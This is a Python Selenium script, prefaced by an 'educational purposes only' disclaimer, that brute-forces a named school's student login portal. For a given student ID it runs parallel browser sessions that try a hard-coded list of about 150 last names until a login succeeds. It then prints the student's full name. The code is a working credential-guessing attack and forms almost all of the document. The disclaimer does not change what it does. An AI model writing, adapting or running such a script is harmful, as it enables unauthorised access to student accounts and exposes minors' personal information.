'''
DISCLAIMER: EDUCATIONAL PURPOSES ONLY

The script discussed here demonstrates how certain web automation techniques could theoretically be used to find
student information (such as school IDs and last names) through school portals.

Important Notes:

Legal & Ethical Considerations:

Accessing or extracting personal information without explicit authorization is illegal in most jurisdictions (violating laws like FERPA, GDPR, etc.)

School systems often have strict security policies - unauthorized access may result in legal consequences or academic penalties

Intended Use:

This material is provided solely for educational purposes to demonstrate web automation concepts

It is meant for cybersecurity professionals, educators, and students learning about:

Ethical web scraping

System vulnerability awareness

Responsible disclosure practices

Prohibited Uses:

Do not use this information to access systems without written permission

Never collect, store, or distribute personal student data

Avoid using automated tools against systems that prohibit them in their ToS

Responsibility:

The author provides this information with the expectation of ethical use

Users assume full liability for any misuse

Educational institutions should use this knowledge to strengthen their security

Ethical Alternatives:

Always seek explicit permission before testing systems

Use school-approved APIs when available

Report vulnerabilities through proper channels

By studying this material, you agree to use this knowledge lawfully and ethically.
'''





import os
import time
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from pyfiglet import figlet_format
from concurrent.futures import ThreadPoolExecutor

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')

def test_credentials(user_id, last_names_sublist, instance_num):
    driver = webdriver.Chrome()
    driver.get("https://5starstudents.com/americanhs/login")
    
    try:
        id_field = driver.find_element(By.ID, "Number")
        id_field.clear()
        id_field.send_keys(user_id)
        
        for last_name in last_names_sublist:
            name_field = driver.find_element(By.ID, "LastName")
            name_field.clear()
            name_field.send_keys(last_name)
            name_field.send_keys(Keys.RETURN)
            
            time.sleep(1)
            
            current_url = driver.current_url
            if current_url != "https://5starstudents.com/americanhs/login":
                end_time = datetime.now()
                time_taken = end_time - start_time
                
                try:
                    full_name_element = driver.find_element(By.CSS_SELECTOR, "h4.mb-2.mb-sm-0.ms-sm-3.me-3")
                    full_name = full_name_element.text.strip()
                except:
                    full_name = "Full name not found"
                
                clear_terminal()
                print(figlet_format(text=full_name, font="slant"))
                print("="*50)
                print(f"SUCCESS! Match found in {time_taken.total_seconds():.2f} seconds")
                print("="*50)
                print(f"ID:        {user_id}")
                print(f"Name:      {full_name}")
                print(f"Last Name: {last_name}")
                print("="*50)
                return True
            
            time.sleep(0.5)
            
    except Exception as e:
        print(f"Instance {instance_num} error: {e}")
    finally:
        driver.quit()
    return False

def split_list(lst, n):
    k, m = divmod(len(lst), n)
    return [lst[i*k+min(i, m):(i+1)*k+min(i+1, m)] for i in range(n)]

if __name__ == "__main__":
    clear_terminal()
    user_id = input("Enter the ID to use: ")
    instances = int(input("Enter number of concurrent instances to use (1-10 recommended): "))
    
    last_names = [
        "Sharma", "Peterson", "Garcia", "Navarrete", "Pelayo", "Canas", "Sorensen", 
    "Chen", "Felix", "Stallworth", "Ronkainen", "Hansen", "Zheng", "Granados", 
    "Sheikh", "Gupta", "Saboo", "Salguero", "Jefferson", "Yeung", "Chow", "Hug", 
    "Ng", "Ong", "Littlejohn", "Lozana", "Murad", "Teixeira", "Adiraju", "Adl", 
    "Ahmed", "Amato", "Anderson", "Arora", "B.C.", "Baker", "Barbu", "Bates", 
    "Benedetti", "Benn", "Benz", "Bhasin", "Bischofberger", "Bonaccorsi", 
    "Booher-Kaeding", "Kaeding", "Brittain", "Brucker", "Bui", "Bullington", 
    "Carel", "Carlton", "Chase", "Christensen", "Cimino", "Cimino", "Ciz", 
    "Cole", "Contreras", "Cooper", "Crawford", "Cruz", "Cruz Pivaral", "Pivaral", "D'Souza", "Souza",
    "De Martini", "Martini", "Dennis", "Do", "Dogra", "Elam", "Fornwald", "Franklin", 
    "Fronda", "Greene", "Grewal", "Guidace Angileri", "Angileri", "Gutierrez", "Hashimoto", 
    "Holcomb", "Howard", "Huang", "Huang", "Iglesias", "Jeung", "Johnson", 
    "Jose", "Kagel", "Kaur", "Kerr", "Leonarduzzi", "Lindsay", "Liu", "London", 
    "Lopez", "Luong", "Lyons", "Mameesh", "Mapelli", "Martin", "Martinez", 
    "Martinez", "McCluskey", "McLoy", "Min", "Mirshad", "Mukherjee", "Newsom", 
    "Noori", "Olson", "Ortiz", "Oviatt", "Pacio", "Peffer", "Penaverde", 
    "Peterson", "Prabhakaran", "Reid", "Resendez", "Riley", "Roberts", 
    "Rodrigues", "Rojas", "Rojas", "Sanfacon", "Sangam", "Savoie", "Pahna", 
    "Sharma", "Shockley", "Smith", "Soria", "Stephan", "Thorsen", "Tripp", 
    "Tucker", "Veizades", "Von Furst", "Furst", "Von", "Webb", "Wheaton", "Wilkinson", 
    "Williams", "Wong", "Woo", "Yazar", "Yow", "Yu", "Zamora", "Zheng"
    ]
    
    name_sublists = split_list(last_names, instances)
    
    print(f"\nStarting {instances} concurrent instances...")
    print(f"Total last names to test: {len(last_names)}")
    print(f"Names per instance: ~{len(name_sublists[0])}")
    print("="*50 + "\n")
    
    start_time = datetime.now()
    
    with ThreadPoolExecutor(max_workers=instances) as executor:
        futures = []
        for i, sublist in enumerate(name_sublists, 1):
            futures.append(executor.submit(test_credentials, user_id, sublist, i))
        
        found = False
        for future in futures:
            if future.result():
                found = True
                break
        
        if not found:
            end_time = datetime.now()
            time_taken = end_time - start_time
            print(f"\nNo matching last name found with ID {user_id} after {time_taken.total_seconds():.2f} seconds")
            
        executor.shutdown(wait=False)
